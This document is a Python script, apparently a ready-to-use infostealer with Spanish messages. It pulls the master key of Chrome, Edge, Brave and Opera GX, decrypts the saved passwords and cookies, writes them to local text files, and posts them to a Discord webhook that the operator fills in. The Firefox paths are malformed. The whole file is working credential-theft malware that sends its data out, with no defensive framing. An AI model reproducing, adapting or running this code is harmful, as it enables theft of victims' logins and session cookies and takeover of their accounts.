import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import requests

def get_master_key(browser_path):
    try:
        with open(browser_path, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        return None

def decrypt_cookie(encrypted_cookie, master_key):
    try:
        iv = encrypted_cookie[:12]
        encrypted_cookie = encrypted_cookie[12:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_cookie).decode('utf-8', errors='ignore')
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_cookie, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except:
            return None

def fetch_passwords(browser_name, db_path, local_state_path):
    passwords = []
    master_key = get_master_key(local_state_path)
    if not master_key:
        return passwords

    try:
        shutil.copy2(db_path, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = decrypt_password(encrypted_password, master_key)
            if username or password:
                passwords.append({"url": url, "username": username, "password": password})
        cursor.close()
        conn.close()
        os.remove("Loginvault.db")
    except:
        pass

    return passwords

def fetch_cookies(browser_name, db_path, local_state_path):
    cookies = []
    master_key = get_master_key(local_state_path)
    if not master_key:
        return cookies

    try:
        shutil.copy2(db_path, "Cookies.db")
        conn = sqlite3.connect("Cookies.db")
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, value, encrypted_value FROM cookies")
        for host_key, name, path, value, encrypted_value in cursor.fetchall():
            if value == "":
                value = decrypt_cookie(encrypted_value, master_key)
            cookies.append({
                "host": host_key,
                "name": name,
                "path": path,
                "value": value
            })
        cursor.close()
        conn.close()
        os.remove("Cookies.db")
    except:
        pass

    return cookies

def save_to_txt(browser_name, data, data_type):
    folder_path = os.path.join("credenciales", browser_name)
    os.makedirs(folder_path, exist_ok=True)

    file_name = f"{data_type}.txt"
    file_path = os.path.join(folder_path, file_name)
    with open(file_path, "w", encoding="utf-8") as file:
        for item in data:
            file.write(f"URL: {item.get('url', 'N/A')}\n")
            file.write(f"Username: {item.get('username', 'N/A')}\n")
            file.write(f"Password: {item.get('password', 'N/A')}\n")
            file.write(f"Host: {item.get('host', 'N/A')}\n")
            file.write(f"Name: {item.get('name', 'N/A')}\n")
            file.write(f"Path: {item.get('path', 'N/A')}\n")
            file.write(f"Value: {item.get('value', 'N/A')}\n")
            file.write("-" * 50 + "\n")

def send_to_discord(webhook_url, data):
    if not data:
        print("No hay datos para enviar.")
        return

    headers = {"Content-Type": "application/json"}
    payload = {
        "content": "Datos extraídos:",
        "embeds": [{
            "title": "Credenciales",
            "description": json.dumps(data, indent=4),
            "color": 0x00ff00
        }]
    }

    try:
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        if response.status_code == 204:
            print("Datos enviados a Discord con éxito.")
        else:
            print(f"Error al enviar datos a Discord: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error en la solicitud: {e}")

def main():
    webhook_url = "" # EDITAR WEBHOOK

    browsers = {
        "Chrome": {
            "passwords_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
            "cookies_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        },
        "Edge": {
            "passwords_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
            "cookies_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        },
        "Brave": {
            "passwords_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
            "cookies_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
        },
        "OperaGX": {
            "passwords_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"),
            "cookies_db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Network", "Cookies"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
        },
        "Firefox": {
            "passwords_db_path": os.path.join(os.environ["USERPROFILE"], "%APPDATA%", "Mozilla", "Firefox", "Profiles"),
            "cookies_db_path": os.path.join(os.environ['USERPROFILE'], "%APPDATA%", "Mozilla", "Firefox", "Profiles"),
            "local_state_path": os.path.join(os.environ['USERPROFILE'], "%APPDATA%", "Mozilla", "Firefox", "Local State")
        }
    }

    for browser, paths in browsers.items():
        passwords = fetch_passwords(browser, paths["passwords_db_path"], paths["local_state_path"])
        save_to_txt(browser, passwords, "credentials")
        send_to_discord(webhook_url, passwords)

        cookies = fetch_cookies(browser, paths["cookies_db_path"], paths["local_state_path"])
        save_to_txt(browser, cookies, "cookies")
        send_to_discord(webhook_url, cookies)

if __name__ == "__main__":
    main()